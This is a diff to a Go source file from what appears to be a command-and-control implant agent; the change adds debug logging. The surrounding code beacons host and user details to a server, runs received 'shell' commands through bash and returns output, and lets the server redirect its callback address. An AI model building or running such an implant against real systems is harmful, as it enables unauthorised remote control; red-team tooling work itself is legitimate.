@@ -66,12 +66,12 @@ func SendBeacon(config *tls.Config, serverIP, serverPort, agentUUID, user, hostn
     if err != nil {
         return nil, err
     }
-
+    logger.Logf(logger.Info, "Server Connected\n")
     ipAddress := beacon.LocalAddr().(*net.TCPAddr)
     ip := fmt.Sprintf("%v", ipAddress)
     init := fmt.Sprintf("%s:%s:%s:%s:NoKeysBeacon:%s:%s:%s:%s:MASTERKEY",
         agentUUID, user, hostname, ip, serverIP, serverPort, callbackFrequency, callbackJitter)
-
+    logger.Logf(logger.Debug, "Sending : %s\n", init)
     _, err = beacon.Write([]byte(init + "\n"))
     if err != nil {
         return nil, err
@@ -89,6 +89,7 @@ func HandleCommand(instruct *types.GiveAgentCommand, user, hostname, agentUUID s
 
     switch CommandType {
     case "shell":
+        logger.Logf(logger.Debug, "Command to run : %s\n", Command)
         if Command != "" {
             c := exec.Command("bash", "-c", Command)
             buf, err := c.CombinedOutput()
@@ -96,6 +97,7 @@ func HandleCommand(instruct *types.GiveAgentCommand, user, hostname, agentUUID s
                 CmdOut = err.Error()
             }
             CmdOut += string(buf)
+            logger.Logf(logger.Done, "Command executed successfully : %s\n", CmdOut)
             destruct = types.GiveServerResult{
                 Uuid:        instruct.UpdateAgentConfig.Uuid,
                 Result:      "1",
@@ -146,6 +148,7 @@ func CalculateJitter(callbackFrequency, callbackJitter string) time.Duration {
 
 // UpdateAgentConfig updates the agent's configuration based on the received instructions.
 func UpdateAgentConfig(instruct *types.GiveAgentCommand, ServerIP, ServerPort, CallbackFrequency, CallbackJitter *string) {
+    logger.Logf(logger.Debug, "%s\n", instruct.UpdateAgentConfig.CallbackTo)
     if instruct.UpdateAgentConfig.CallbackTo != "" {
         glob := strings.Split(instruct.UpdateAgentConfig.CallbackTo, ":")
         *ServerIP = glob[0]
@@ -157,4 +160,5 @@ func UpdateAgentConfig(instruct *types.GiveAgentCommand, ServerIP, ServerPort, C
     if instruct.UpdateAgentConfig.CallbackJitter != "" {
         *CallbackJitter = instruct.UpdateAgentConfig.CallbackJitter
     }
+    logger.Logf(logger.Debug, "Received : %s\n", instruct)
 }
